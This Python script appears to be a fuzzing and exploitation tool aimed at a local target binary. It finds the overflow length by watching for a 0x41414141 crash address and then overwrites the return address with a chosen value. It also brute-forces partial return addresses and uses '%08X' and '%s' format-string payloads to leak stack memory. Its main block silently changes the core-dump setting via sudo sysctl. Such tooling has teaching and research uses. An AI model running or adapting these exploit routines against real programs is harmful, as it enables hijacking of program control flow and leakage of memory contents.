# This is a sample Python script.

# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
from struct import pack
import subprocess
import resource
from numpy import little_endian
import pexpect
from fuzzingbook.Fuzzer import RandomFuzzer
import os
import sys
import subprocess
from fuzzingbook.GrammarCoverageFuzzer import GrammarCoverageFuzzer
from fuzzingbook.Grammars import Grammar, EXPR_GRAMMAR, CGI_GRAMMAR, START_SYMBOL, URL_GRAMMAR
from fuzzingbook.MutationFuzzer import MutationFuzzer
from fuzzingbook.SearchBasedFuzzer import mutate
from pwn import *
from pwnlib import *
from pwn import p32
import difflib


def cmd_line_call(name, args):
    child = pexpect.spawn(name, [args])
    # Wait for the end of the output
    child.expect(pexpect.EOF)
    out = child.before  # we get all the data before the EOF (stderr and stdout)
    child.close()  # that will set the return code for us
    # signalstatus and existstatus read as the same (for my purpose only)
    if child.exitstatus is None:
        returncode = child.signalstatus
    else:
        returncode = child.exitstatus
    return (out, returncode)


def findMinBadLen(fuzzFile, fuzzedProgram, mutations, inputFromFile,detailedLog):
    minBadLen = sys.maxsize
    lenToReachReturnAddr = sys.maxsize
    inp = ""
    broken=0
    if inputFromFile:
        for i in range(1,mutations):
            inp = inp + 'A'
            currLen = len(inp)
            # create files and keep feeding them into the system
            inputFromFile = open(fuzzFile, 'wb')
            inputFromFile.write(currLen.to_bytes(4, 'big'))
            inputFromFile.write(bytes(inp, 'utf-8'))
            inputFromFile.close()
            try:
                output = subprocess.run([fuzzedProgram, fuzzFile], capture_output=True, text=True, shell=False, check=True, errors='ignore')
                if detailedLog:
                    print(output.stdout)
                    print(output.stderr)
            except subprocess.CalledProcessError:
                if broken==0:
                    minBadLen = currLen
                    broken=1
                    if detailedLog:
                        print(i, f"crushed the system with inp={repr(inp)} and len=", currLen)
                faultAddr=sigFaultAddr()    
                if faultAddr== '0x41414141':
                    lenToReachReturnAddr=currLen-4
                    break
    else:
        for i in range(mutations):
            inp = inp + 'A'
            currLen = len(inp)
            try:
                output = subprocess.run([fuzzedProgram, inp], capture_output=True, text=True, shell=False, check=True, errors='ignore')
                if detailedLog:
                    print(output.stdout)
                    print(output.stderr)
            except subprocess.CalledProcessError:
                if broken==0:
                    minBadLen = currLen
                    broken=1
                    if detailedLog:
                        print(i, f"crushed the system with inp={repr(inp)} and len=", currLen)
                faultAddr=sigFaultAddr()    
                if faultAddr== '0x41414141':
                    lenToReachReturnAddr=currLen-4
                    break
    print(f"The minimum bad len input that was found is {minBadLen}")
    return lenToReachReturnAddr


def attackSystem(lenToReachReturnAddr, fuzzedProgram, fuzzFile, attackAddress,inputFromFile, detailedLog):
    if lenToReachReturnAddr==sys.maxsize:
        print("System was not broken due to lack of mutations or segmentation fault not occuring")
        return 0
    if inputFromFile:
        inputFromFile = open(fuzzFile, 'wb')
        attackLen = (lenToReachReturnAddr + 4).to_bytes(4, 'big')
        attackString = b'A' * lenToReachReturnAddr + attackAddress
        inputFromFile.write(attackLen)
        inputFromFile.write(attackString)
        inputFromFile.close()
        if detailedLog:
            print("NOW WE ATTACK")
            print("This is our weapon ", fuzzFile)
            print(attackLen)
            print(attackString)
        output, returncode = cmd_line_call(fuzzedProgram, fuzzFile)
        if detailedLog:
            print(output)
            print("Return code=", returncode)
    else:
        inp=lenToReachReturnAddr*b"A"
        inp=inp+attackAddress
        attackLen=(lenToReachReturnAddr + 4)
        if detailedLog:
            print("NOW WE ATTACK")
            print("This is our weapon ", inp)
        subprocess.call([fuzzedProgram,inp])
        
    return attackLen


def breakSystemBeforeReturn(lenToReachReturnAddr, fuzzedProgram, fuzzFile, inputFromFile,detailedLog):
    # +4 to overwrite the return address
    inp = b'A' * (lenToReachReturnAddr + 4)
    i=1
    gb=10_000_000_000
    faultAddr='0x41414141'
    if inputFromFile:
        while i<gb and faultAddr== '0x41414141':
            inp = inp + i*b'A'
            currLen = lenToReachReturnAddr+4+i
            # create files and keep feeding them into the system
            file = open(fuzzFile, 'wb')
            file.write(currLen.to_bytes(4, 'big'))
            file.write(inp)
            file.close()
            output, returncode = cmd_line_call(fuzzedProgram, fuzzFile)
            if detailedLog:
                print(output)
                print(returncode)
                print("Len=", currLen)
                print("Si_addr=", sigFaultAddr())
            i=i*10
            faultAddr=sigFaultAddr()
    else:
        while i<gb and faultAddr== '0x41414141':
            inp = inp + i*b'A'
            currLen = lenToReachReturnAddr+4+i
            try:
                output = subprocess.run([fuzzedProgram, inp], capture_output=True, text=True, shell=False, check=True, errors='ignore')
                if detailedLog:
                    print(output)
            except subprocess.CalledProcessError:
                if detailedLog:
                    print("Len=", currLen)
                    print("Si_addr=", sigFaultAddr())
            except OSError:
                break
            i=i*10
            faultAddr=sigFaultAddr()
    if i>=gb:
        print("The attack file can be at least 1 GB in size")
    else:
        print(f"The attack file size can be at least {int(i/10)} bytes in size")

#Make the address big endian
#returns a normal view of the address into a string form
def convertAddressToString(addr):
    addr=str(addr)
    aux=addr.replace("\\x",'')
    aux=aux.replace("b'",'')
    aux=aux.replace('\'','')
    flipBytes=""
    i=1
    auxc=''
    for c in reversed(aux):
        if i%2==1:
            auxc=c
        else:
            flipBytes=flipBytes+c+auxc
        i=i+1
    return flipBytes


# partial address must contain full bytes
def attackWithPartialAddress(lenToReachReturnAddr, partialAddress, fuzzedProgram, fuzzFile, inputFromFile,detailedLog):

    # build the address
    partialAddressLen = len(partialAddress)
    unknownBytesNr = 4 - partialAddressLen
    possibleAddresses= pow(256,unknownBytesNr)
    validAddresses=[b'0']
    if inputFromFile :
        for i in range(possibleAddresses.__round__()):
            file = open(fuzzFile, 'wb')
            attackAddress = i.to_bytes(unknownBytesNr, 'big') + partialAddress
            # build the attack
            attackLen = (lenToReachReturnAddr + 4).to_bytes(4, 'big')
            inp = b'A' * lenToReachReturnAddr
            file.write(attackLen)
            file.write(inp)
            file.write(attackAddress)
            file.close()
            if detailedLog:
                print("NOW WE ATTACK")
                print("This is our weapon ", fuzzFile)
                print(inp)
                print(attackAddress)
            try:
                output = subprocess.run([fuzzedProgram, fuzzFile], capture_output=True, text=True, shell=False, check=True, errors='ignore')
            except subprocess.CalledProcessError:
                faultAddr=sigFaultAddr().replace("0x",'')
                myaddr=convertAddressToString(attackAddress)
                if faultAddr!='0' and faultAddr!=myaddr:
                    #execution got deflected to a valid address
                    validAddresses.append(attackAddress)
                else:
                    if detailedLog:
                        print("Not a valid address", attackAddress)
    else:
        for i in range(1,possibleAddresses):
            attackAddress = i.to_bytes(unknownBytesNr, 'big') + partialAddress.encode(encoding="latin")
            inp = b'A' * lenToReachReturnAddr
            inp=inp+ attackAddress
            if detailedLog:
                print("NOW WE ATTACK")
                print(inp)
                print(attackAddress)
            try:
                output = subprocess.run([fuzzedProgram, inp], capture_output=True, text=True, shell=False, check=True, errors='ignore')
                print(output)
            except subprocess.CalledProcessError:
                faultAddr=sigFaultAddr().replace("0x",'')
                myaddr=convertAddressToString(attackAddress)
                if faultAddr!='0' and faultAddr!=myaddr:
                    #execution got deflected to a valid address
                    validAddresses.append(attackAddress)
                else:
                    if detailedLog:
                        print("Not a valid address", attackAddress)
            except ValueError:
                if detailedLog:
                    print("Address contains null bytes",attackAddress)
    validAddresses.remove(b'0')
    return validAddresses
    
 #Extract the fault_addr value with the help of the core file 
def sigFaultAddr():

    c = Corefile('./core')
    return hex(c.fault_addr)

#Check for format string
def checkForFormatString(fuzzedProgram,formatParameter,fuzzFile,inputFromFile,detailedLog):
    inp=""+formatParameter
    if inputFromFile:
        file = open(fuzzFile, 'wb')
        attackString=inp.encode('ascii')
        file.write(attackString)
        file.close()
    try:
        if inputFromFile:
            output = subprocess.run([fuzzedProgram, fuzzFile], capture_output=True, text=True, shell=False, check=True, errors='ignore')
        else:
            output = subprocess.run([fuzzedProgram, inp], capture_output=True, text=True, shell=False, errors='ignore')
        if detailedLog:
            print(f"The output for checking if there is a format string using {formatParameter}")
            print(output.stdout)
        if formatParameter in output.stdout:
            print("The program has no format string")
            return False
    except subprocess.CalledProcessError:
        return True
    return True


#How many characters could the input buffer take
def maxLengthOfTheFormatString(fuzzedProgram,fuzzFile,inputFromFile,detailedLog):
    inp="A"
    i=1
    gb=10_000_000_000
        
    while i<gb:
        inp='A'*i
        if inputFromFile:
            file = open(fuzzFile, 'wb')
            attackString=inp.encode('ascii')
            file.write(attackString)
            file.close()
        try:
            if inputFromFile:
                subprocess.run([fuzzedProgram, fuzzFile], capture_output=True, text=True, shell=False, check=True, errors='ignore')
            else:
                subprocess.run([fuzzedProgram, inp], capture_output=True, text=True, shell=False, errors='ignore')
        except subprocess.CalledProcessError:
            break
        except OSError:
                break
        i=i*10
    if detailedLog:
        print(f"The attack string size can be at least {int(i/10)} characters in size")
    return i


#How long can the input be only unsing format string parameters
def howManyFormatParameters(fuzzedProgram,formatParameter,mutations,maxLen,fuzzFile ,inputFromFile, detailedLog):
    inp=formatParameter
    for i in range (1,mutations):
        if inputFromFile:
            file = open(fuzzFile, 'wb')
            attackString=inp.encode('ascii')
            file.write(attackString)
            file.close()
            output = subprocess.run([fuzzedProgram, fuzzFile], capture_output=True, text=True, shell=False, errors='ignore')
        else:
            output = subprocess.run([fuzzedProgram, inp], capture_output=True, text=True, shell=False, errors='ignore')
            
        if output.returncode==-11:
            # it must be i/len(formatParameter) since "%" and "s" whould count as two different characters
            if int(i/len(formatParameter))< maxLen:
                if detailedLog:
                    print("The program contains the format string vulnerabilty")
                    print(f"The program crashes with a string containing {i} \"{formatParameter}\"")
                return i
            else:
                if detailedLog:
                    print("The program crashed from diffrent reasons other than format string")
                return 0  
        inp=inp+formatParameter
    #count how many times did the '#' character appear in stdout to check if all of the format parameters were consumed by the program
    count=0
    for i in output.stdout:
        if i=='#':
            count=count+1
    if count<mutations:
        if detailedLog:
            print(f"The program crashes with a string containing {count} \"{formatParameter}\"")
        return count
    
    if detailedLog:     
        print(f"The program can support at least {mutations} characters of the type \"{formatParameter}\"")
    return mutations


#Try to map the memory using %s at different possitions on the stack for memory leaking purposes
def mapMemory(fuzzedProgram,formatParameter,mutations,fuzzFile,inputFromFile,detailedLog,showFails):
    inp=""
    possitionsOfValidAddresses=[]
    stringValueOfValidAddress=[]
    byteValueOfValidAddress=[]
    for i in range(0,mutations):
        inp=i*formatParameter+"%s#"
        if inputFromFile:
            file = open(fuzzFile, 'wb')
            attackString=inp.encode('ascii')
            file.write(attackString)
            file.close()
            output = subprocess.run([fuzzedProgram, fuzzFile], capture_output=True, text=True, shell=False, errors='ignore')
        else:
            output = subprocess.run([fuzzedProgram, inp], capture_output=True, text=True, shell=False, errors='ignore')
        if output.returncode!=-11:
            #the program did not end in a segmentation fault
            if detailedLog:
                print(f"\n**************{i}**************\n")
                print(f"The input string is: {inp}")
                print("Output using \"%s\":")
                print(output.stdout)
            possitionsOfValidAddresses.append(i)
            inp=(i+1)*formatParameter
            if inputFromFile:
                file = open(fuzzFile, 'wb')
                attackString=inp.encode('ascii')
                file.write(attackString)
                file.close()
                outputx = subprocess.run([fuzzedProgram, fuzzFile], capture_output=True, text=True, shell=False, check=True, errors='ignore')
            else:
                outputx = subprocess.run([fuzzedProgram, inp], capture_output=True, text=True, shell=False, errors='ignore')
            
            if detailedLog:
                print(f"The input string is: {inp}")
                print(f"Output using only \"{formatParameter}\":")
                print(outputx.stdout)
            #extract the last byte and its value from the output
            stringV=output.stdout[(i+1)*9:]
            byteV=outputx.stdout[(i+1)*9:]
            stringValueOfValidAddress.append(stringV)
            byteValueOfValidAddress.append(byteV)
            if detailedLog:
                print(f"string value of the last format parameter: {stringValueOfValidAddress[-1]}")
                print(f"byte value of the last format parameter: {byteValueOfValidAddress[-1]}")
                print(f"\n**************{i}**************\n")
        else:
            if showFails and detailedLog:
                print(f"\n**************{i}**************\n")
                print(f"The input string is: {inp}")
                print("Program ended with a segmentation fault")
                print(f"\n**************{i}**************\n")
    return possitionsOfValidAddresses,stringValueOfValidAddress
         
         
def test():
    partialAddress=0x800012
    littleEndian=p32(partialAddress, endian='little')
    print(littleEndian)   
        

# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    #Set the core file limit and path
    resource.setrlimit(
    resource.RLIMIT_CORE,
    (resource.RLIM_INFINITY, resource.RLIM_INFINITY))
    stream = os.popen('echo Returned output')
    output = stream.read()
    if output != "kernel.core_pattern = core":
        os.system("sudo sysctl kernel.core_pattern=core")
    #////////////////////////////////
    
    #Read the parameters from the input file
    f = open("input.txt", "r")
    
    line = f.readline().split()
    fuzzFile=line[line.index("=") +1]
    
    line = f.readline().split()
    fuzzedProgram=line[line.index("=") +1]
    
    line = f.readline().split()
    attackAddress=int(line[line.index("=") +1],base=16)
    
    line = f.readline().split()
    partialAttackAddress=int(line[line.index("=") +1],base=16)
    
    line = f.readline().split()
    missingBytes=int(line[line.index("=") +1])
    
    line = f.readline().split()
    mutations=int(line[line.index("=") +1])
    
    inputFromFile=False
    line = f.readline().split()
    if line[line.index("=") +1] == 'True':
        inputFromFile=True
    
    checkForBufferOverflow=False
    line = f.readline().split()
    if line[line.index("=") +1] == 'True':
        checkForBufferOverflow=True
        
    detailedLog=False
    line = f.readline().split()
    if line[line.index("=") +1] == 'True':
        detailedLog=True   
        
    showFails=False
    line = f.readline().split()
    if line[line.index("=") +1] == 'True':
        showFails=True  
    #Set variables for the fuzzed program
    littleEndian=p32(attackAddress, endian='little')
    littleEndianPartial=p32(partialAttackAddress, endian='little')
    partial = littleEndianPartial[:4-missingBytes] + littleEndianPartial[4+missingBytes:]
    sys.stdout = open('log.txt', 'w')
    
    #test()
    
    if(checkForBufferOverflow):
        lenToReachReturnAddr = findMinBadLen(fuzzFile, fuzzedProgram, mutations,inputFromFile,detailedLog)
        if lenToReachReturnAddr==sys.maxsize:
            print("The bufferoverflow was not reached or recheck if the parameters are the rigth ones")
        else:
            attackSystem(lenToReachReturnAddr,fuzzedProgram,fuzzFile,littleEndian,inputFromFile,detailedLog)
            validAddresses=attackWithPartialAddress(lenToReachReturnAddr,partial, fuzzedProgram,fuzzFile,inputFromFile,detailedLog)
            print(f"A total {len(validAddresses)} of valid addresses that deflect the program:")
            print(validAddresses)
            breakSystemBeforeReturn(lenToReachReturnAddr, fuzzedProgram, fuzzFile, inputFromFile,detailedLog)
    else:
        formatParameter="%08X#"
        if checkForFormatString(fuzzedProgram,formatParameter,fuzzFile,inputFromFile,detailedLog):
            print("The program contains the format string vulnerability")
            maxLen=maxLengthOfTheFormatString(fuzzedProgram,fuzzFile,inputFromFile,detailedLog)
            lenOfString=howManyFormatParameters(fuzzedProgram,formatParameter,mutations,maxLen,fuzzFile,inputFromFile,detailedLog)
            if lenOfString!=0:
                possitionsOfValidAddresses,stringValueOfValidAddress=mapMemory(fuzzedProgram,formatParameter,lenOfString,fuzzFile,
                                                                               inputFromFile,detailedLog,showFails)
                print(f"There are {len(possitionsOfValidAddresses)} bytes that contain a valid address after trying {mutations} mutations:")
                print("They represent the relative position from the beginning of the stack of the fuzzed program:")
                print("Offset \t \t Value")
                possibleReturnAdr=[]
                for i in range(len(possitionsOfValidAddresses)):
                    if stringValueOfValidAddress[i].isascii() and stringValueOfValidAddress[i]!="":
                        possibleReturnAdr.append(possitionsOfValidAddresses[i])           
                    print(f"{possitionsOfValidAddresses[i]} \t \t \t {stringValueOfValidAddress[i]}\n")
                print(f"There are {len(possibleReturnAdr)} addresses were the Return address could reside in:")
                print(possibleReturnAdr)
        else:
            print("The program does NOT contain the format string vulnerability")
            
        
    sys.stdout.close()



